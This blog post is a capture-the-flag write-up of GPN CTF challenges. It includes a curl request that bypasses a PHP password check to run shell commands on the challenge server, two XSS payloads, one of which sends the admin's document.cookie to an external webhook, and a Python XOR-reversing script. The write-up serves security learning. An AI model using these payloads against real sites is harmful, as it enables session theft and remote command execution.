---
layout: post
title: "The Summer of Challs: Week 4"
date: 2024-06-07
categories: CTFs
---

This week, I tried out the very cool GPN CTF, where the challenges are laid out in a UI that looks like a spotify dashboard. I again focused on web, and tried a little more rev. There were some really cool challenges in here, mostly XSS focused. Here are the ones I found most interesting:

## NEVER GONNA TELL A LIE AND TYPE YOU (WEB)

We open the webapp and see a white screen with a couple of error messages: 

![RR](/assets/RRapp.jpg)

There wasn't much functionality here, so I went straight to the source code provided by the challenge. The server is written in PHP - the first error displayed can be explained by these lines: 

```PHP
    ini_set("display_errors",1);
    error_reporting(E_ALL);
```
The second error, which was more strange, can be explained by these lines: 

```PHP
if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman"){
    die("we don't tolerate toxicity");
}
```

It looks like we have to spoof our user agent to be "friendlyHuman" in order to get some functionality. I used the chrome dev tools to do this, reloaded the page, and saw this:

![RRUA](/assets/RRUA.jpg)

None of this output is really a surprise, because the source code generates this HTML if the user agent check is passed. The crucial part of the source code after passing this user agent check lies in these few lines: 

```PHP
if($user_input->{'user'} === "admin🤠") {
        if ($user_input->{'password'} == securePassword($user_input->{'password'})  ){
            echo " hail admin what can I get you ". system($user_input->{"command"});
        }
        else {
            die("Skill issue? Maybe you just try  again?");
        }}
```

We need some way of posting data that would authenticate us as the admin user, so we can then execute a command via `system($user_input->{"command"})`.
At first, I thought this had something to do with the fact that the if statement for the admin's password uses a loose comparison (==) instead of a strict comparison (===) like with the user field. However, I couldn't figure out any ways to mess with this.

I then looked more closely at the `securePassword()` function called when comparing our input: 

```PHP
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;
}
```

It takes our input, checks if it less than 10,000, (possibly to prevent any type juggling bypasses?) and hashes it, with some multiplications and a substring. It is finally cast to an integer, multiplied by our original input, and returned. Seems pretty hard to get past this.

However, we can solve it with some dumb, blunt force. My first thought was to pass the PHP constant `INF` as the password (literally the constant for infinity). This would cause `securePassword()` function to return `INF`, and our input `INF` would be the same, bypassing the check.

This didn't work. However, in PHP, when an integer is passed that is too large, it actually gets converted into a floating point value. So instead of infinity, I just entered a massive number, far larger than whatever the maximum float value was, hoping that would result in a similar "infinite-like" comparison. To do this, I formed the following cURL command, making sure to spoof my http user agent with the `-A` flag:

```
curl -A "friendlyHuman" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'data={"user":"admin🤠","password":7480918237401928374019283741098237410928347109823740198237401982374109823741092384710923874019238471029384710923847092837123049871230984710293847109283744019283740198237430419823741861100010000000000000000000000000000000000000000035699000000003102398471092837411029384710298347019283740192837401928374109283741029834710928374019823740918237409182374019283740192837412340981723409817230498172309847102938471092387410928374190823748091823740192837401928374109823741092834710982374019823740198237410982374109238471092387401923847102938471092384709283712304987123098471029384710928374401928374019823743041982374186110001000000000000000000000000000000000000000003569900000000310239847109283741102938471029834701928374019283740192837410928374102983471092837401982374091823740918237401928374019283741234098172340981723049817230984710293847109238741092837419082374809182374019283740192837410982374109283471098237401982374019823741098237410923847109238740192384710293847109238470928371230498712309847102938471092837440192837401982374304198237418611000100000000000000000000000000000000000000000356990000000031023984710928374110293847102983470192837401928374019283741092837410298347109283740198237409182374091823740192837401928374123409817234098172304981723098471029384710923874109283741908237480918237401928374019283741098237410928347109823740198237401982374109823741092384710923874019238471029384710923847092837123049871230984710293847109283744019283740198237430419823741861100010000000000000000000000000000000000000000035699000000003102398471092837411029384710298347019283740192837401928374109283741029834710928374019823740918237409182374019283740192837412340981723409817230498172309847102938471092387410928374190823748091823740192837401928374109823741092834710982374019823740198237410982374109238471092387401923847102938471092384709283712304987123098471029384710928374401928374019823743041982374186110001000000000000000000000000000000000000000003569900000000310239847109283741102938471029834701928374019283740192837410928374102983471092837401982374091823740918237401928374019283741234098172340981723049817230984710293847109238741092837419082374809182374019283740192837410982374109283471098237401982374019823741098237410923847109238740192384710293847109238470928371230498712309847102938471092837440192837401982374304198237418611000100000000000000000000000000000000000000000356990000000031023984710928374110293847102983470192837401928374019283741092837410298347109283740198237409182374091823740192837401928374123409817234098172304981723098471029384710923874109283741908237480918237401928374019283741098237410928347109823740198237401982374109823741092384710923874019238471029384710923847092837123049871230984710293847109283744019283740198237430419823741861100010000000000000000000000000000000000000000035699000000003102398471092837411029384710298347019283740192837401928374109283741029834710928374019823740918237409182374019283740192837412340981723409817230498172309847102938471092387410928374190823748091823740192837401928374109823741092834710982374019823740198237410982374109238471092387401923847102938471092384709283712304987123098471029384710928374401928374019823743041982374186110001000000000000000000000000000000000000000003569900000000310239847109283741102938471029834701928374019283740192837410928374102983471092837401982374091823740918237401928374019283741234098172340981723049817230984710293847109238741092837419082374809182374019283740192837410982374109283471098237401982374019823741098237410923847109238740192384710293847109238470928371230498712309847102938471092837440192837401982374304198237418611000100000000000000000000000000000000000000000356990000000031023984710928374110293847102983470192837401928374019283741092837410298347109283740198237409182374091823740192837401928374123409817234098172304981723098471029384710923874109283741908237480918237401928374019283741098237410928347109823740198237401982374109823741092384710923874019238471029384710923847092837123049871230984710293847109283744019283740198237430419823741861100010000000000000000000000000000000000000000035699000000003102398471092837411029384710298347019283740192837401928374109283741029834710928374019823740918237409182374019283740192837412340981723409817230498172309847102938471092387410928374190823748091823740192837401928374109823741092834710982374019823740198237410982374109238471092387401923847102938471092384709283712304987123098471029384710928374401928374019823743041982374186110001000000000000000000000000000000000000000003569900000000310239847109283741102938471029834701928374019283740192837410928374102983471092837401982374091823740918237401928374019283741234098172340981723049817230984710293847109238741092837419082374809182374019283740192837410982374109283471098237401982374019823741098237410923847109238740192384710293847109238470928371230498712309847102938471092837440192837401982374304198237418611000100000000000000000000000000000000000000000356990000000031023984710928374110293847102983470192837401928374019283741092837410298347109283740198237409182374091823740192837401928374123409817234098172304981723098471029384710923874109283741908237480918237401928374019283741098237410928347109823740198237401982374109823741092384710923874019238471029384710923847092837123049871230984710293847109283744019283740198237430419823741861,"command”:”echo Hello World}’ https://the-final-countdown--pharao-7299.ctf.kitctf.de
```

Yeah, I know, pretty silly. But it worked! Here was the output from the server:

```PHP
object(stdClass)#1 (3) {
  ["user"]=>
  string(9) "admin🤠"
  ["password"]=>
  float(INF)
  ["command"]=>
  string(16) "echo hello world"
}
hello world
 hail admin what can I get you hello world%
```

At this point, I just needed to figure out how to get the flag, which I assumed was somewhere in the server directory path - before there were some messages about being in /var/www/html/index.php. I started by changing the command key in the curl command to `ls /`. This returned successfully and revealed a flag.txt file in the root directory.

Then, to get the flag, I passed the same cURL command, passing the command `cat /flag.txt`, and got this response from the server:
```PHP
object(stdClass)#1 (3) {
  ["user"]=>
  string(9) "admin🤠"
  ["password"]=>
  float(INF)
  ["command"]=>
  string(13) "cat /flag.txt"
}
GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}
 hail admin what can I get you GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}%  
```

For the first web challenge of the CTF, I found this one to be quite hard. But it was still fun, and with its PHP quirks, reminded me a bit of last week's ["Simple Calculator" Challenge](https://davidshenkerman.github.io/ctfs/2024/06/02/Week-3-Angstrom-and-L3ak.html)


## TODO (WEB)

We are greeted with a simple page featuring a box to submit some HTML to the /chal endpoint of the app, and another box to submit HTML to /admin. This is a classic XSS challenge setup, where we create some sort of post containing XSS and send it to the admin to steal their cookies. There was some of this in last week's challenges as well.

The server does this when we submit to `/chal`: 

```JS
app.post('/chal', (req, res) => {
    const { html } = req.body;
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-inline';");
    res.send(`
        <script src="/script.js"></script>
        ${html}
    `);
});
```

We haven't seen much with Content Security Policy (CSP) in the blog yet, but CSP bypass is a common topic in these XSS challenges. This CSP is quite weak, as it allows `unsafe-inline` within `script-src`. This is basically free XSS. However, also note that it sets the `script src` to `/script.js`. If we go to the endpoint directly, we see this:

```JS
class FlagAPI {
    constructor() {
        throw new Error("Not implemented yet!")
    }

    static valueOf() {
        return new FlagAPI()
    }

    static toString() {
        return "<FlagAPI>"
    }

    // TODO: Make sure that this is secure before deploying
    // getFlag() {
    //     return "GPNCTF{FAKE_FLAG_ADMINBOT_WILL_REPLACE_ME}"
    // }
}
```
This is the supposed API that the challenge creators didn't finish (in regards to fictional setup of the challenge, obviously). Anyways, the source code deals with get requests to `/script.js` in this manner:

```JS
app.get('/script.js', (req, res) => {
    res.type('.js');
    let response = script;
    if ((req.get("cookie") || "").includes(randomBytes)) response = response.replace(/GPNCTF\{.*\}/, flag)
    res.send(response);
});
```

That if statement gets the cookie, which is supposed to contain some bytes called `randomBytes`. If the cookie of the user who made the get request has those bytes, the "fake flag" line is replaced with the actual flag that we want. 

Take a wild guess who's cookie has these special bytes. It's really hard to figure out - the admin user. We can see how its set up by again looking at source code:

```JS
app.post('/admin', async (req, res) => {
    try {
        const { html } = req.body;
        const browser = await puppeteer.launch({ executablePath: process.env.BROWSER, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        page.setCookie({ name: 'flag', value: randomBytes, domain: 'localhost', path: '/', httpOnly: true });
        await page.goto('http://localhost:1337/');
        await page.type('input[name="html"]', html);
        await page.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 2000));
        const screenshot = await page.screenshot({ encoding: 'base64' });
        await browser.close();
        res.send(`<img src="data:image/png;base64,${screenshot}" />`);
    } catch(e) {console.error(e); res.send("internal error :( pls report to admins")}
});
```

This code is a bit heavy, but essentially what it does is open a browser in headless mode, sets the cookie to what we want, goes to a local port, renders the HTMl submitted to it, takes a screenshot, and returns it. 

All we have to do at this point is write some HTMl that can make admin go to `/script.js`. When it does, the cookie check will pass, the flag will be replaced, a screenshot will be taken, and returned to us. We can't really use something like fetch because `default-src` is set to none, essentially making `connect-src` default to none. This means we can't connect to other websites or the same site through the URL. We still have `unsafe-inline` though, so we can use a form action and some inline scripting to get the flag.

I created this payload: `<form action="/script.js" id = "1"><script>document.getElementById("1").submit()</script>`, submited it to /admin, and got this screenshot returned to me:

![Todo](/assets/TodoFlag.jpg)

## REFINED NOTES (WEB)

The web app here is a simple note taking app. We can enter some text input, hit add note, and see it rendered.

![RefinedNotes](/assets/RefinedNotes.jpg)

We also have an admin bot that we can submit URLs of created notes to. This is similar to last challenge, and it is again another classic XSS setup. However, there is no CSP this time.

Whenever we enter input, it gets put in the `srcdoc` attribute of an iframe. For instance, if I add a note that says "Hello, World!", it is put in the HTMl like this:

`<iframe id="noteframe" class="bg-white w-full px-3 py-2 border rounded-md h-60" srcdoc="Hello, World!"></iframe>`. You would think that without any CSP, it would be quite easy to escape the srcdoc attribute and get XSS.

Unfortunately, the server makes this a little more challenging. The front end is actually sanitizing our input with DOMPurify:

```JS
submit.addEventListener('click', (e) => {
    const purified = DOMPurify.sanitize(note.value);
    fetch("/", {
        method: "POST",
        body: purified
    }).then(response => response.text()).then((id) => {
        window.history.pushState({page: ''}, id, `/${id}`);
        submit.classList.add('hidden');
        note.classList.add('hidden');
        noteframe.classList.remove('hidden');
        noteframe.srcdoc = purified;
    });
});
```
DOMPurify is a very powerful XSS sanitizer for HTML, and it is extremely hard to bypass. If I figured out a hole in it, I would not need to be writing this blog (only kidding).

The way to solve this isn't through DOMPurify, but through that `srcdoc` attribute in the iframe, which isn't sandboxed at all. `srcdoc` has a very relevant quirk of decoding HTML-encoded text. Additionally, HTML-encoded text is simply read as safe text by DOMPurify, so all we have to do is encode a basic payload and we can get the flag.

I went with the classic `<script> fetch(webhook_url' + '?' + document.cookie); </script>`

![RefinedNotes](/assets/RefinedNotesEncode.jpg)

I added the encoded payload as a note, submitted the url to view the note to the admin bot, and saw this in my webhook dashboard:

![RefinedNotes](/assets/RefinedNotesFlag.jpg)

The curly brackets in the flag were actually encoded (cute). So the actual, final flag was this: `GPNCTF{3nc0d1ng_1s_th3_r00t_0f_4ll_3v1l}`. This was defintely an interesting XSS. Pretty free once you figure out the `srcdoc` quirk. 

## NEVER GONNA RUN AROUND AND REVERSE YOU (REV)

Back with some more rev. We are given two files. The first is "hasher", an executable that takes in some text input, hashes it, and prints it to the terminal. The second is "hash", which is just a text file with an unknown hashed string. If we can figure out how the hashing algorithm works, reverse it, and apply this reverse hash on the given string (which is probably the hashed flag), we can get the flag. 

I used ghidra to decompile hasher, and analyzed this function:

```C
undefined8 FUN_001011e9(int param_1,long param_2)

{
  char *__s;
  size_t sVar1;
  void *pvVar2;
  int local_20;
  
  if (param_1 < 2) {
    printf("Please provide a flag as an argument");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __s = *(char **)(param_2 + 8); //param 2 points to what the user enters, __s holds the input
  sVar1 = strlen(__s); //sVar1 = length of user input
  pvVar2 = malloc((long)((int)sVar1 + 2)); //mallocs space for the user input, plus 2, pvVar2 points to it
  strcpy((char *)((long)pvVar2 + 1),__s); //copies user input, pvVar2 + 1 now points to it. What does pvVar2 itself point to? some unknown garbage value. 
  for (local_20 = 1; local_20 <= (int)sVar1; local_20 = local_20 + 1) {  //for(int i = 1; i <= length(user input), i++)
    *(byte *)((long)pvVar2 + (long)local_20) =
         *(byte *)((long)pvVar2 + (long)local_20) ^ *(byte *)((long)pvVar2 + (long)local_20 + -1); // pvVar2 + i = pvVar2 + i ^ (XOR) pvVar2 + (i - 1) 
    printf("%02x",(ulong)(uint)(int)*(char *)((long)pvVar2 + (long)local_20)); //print hex of pvvar 2 + i
  }
  putchar(10);
  return 0;
}
```

Going line by line here would be a lot, so I left some comments in the code. To summarize, the algorithm essentially goes through each character of the input, and XORs it with the character before it. It finishes with the last character in the input. The question is, what about the first character? What does it get XOR'd with?

To figure that out, we can do some simple texting. When I passed 'A' to hasher, it printed "41". The only value that A can be XOR'd with to get 41 is 0. That means the edge case is handled by XORing with 0, which we will have to include in our solve script. Here is what I came up with, in python:

```python
hashedFlag = bytes.fromhex("4717591a4e08732410215579264e7e0956320367384171045b28187402316e1a7243300f501946325a6a1f7810643b0a7e21566257083c63043404603f5763563e43") ## This is the provided hash
cracked = []
i = 0
while True:
    if i < len(hashedFlag):
        if i == 0:
            cracked.append(chr((int.from_bytes(hashedFlag[i:i+1]) ^ 0)))
        else:
            cracked.append(chr(int.from_bytes(hashedFlag[i:i+1]) ^ int.from_bytes(hashedFlag[i-1:i])))
        i = i + 1
    else:
        break
flag = ''.join(cracked)
print(flag)
```

This printed the flag: GPNCTF{W41t,_h0w_d1d_y0u_s0lv3_th1s?_I_th0ught_1t_w45_4_g00d_h45h}. 

These were some great challenges. I got more practice with XSS, and was happy to try out another rev. We will defintely being seeing more rev on the blog, beyond the basic challenges. Next week may be the week that we finally try a pwn challenge. 




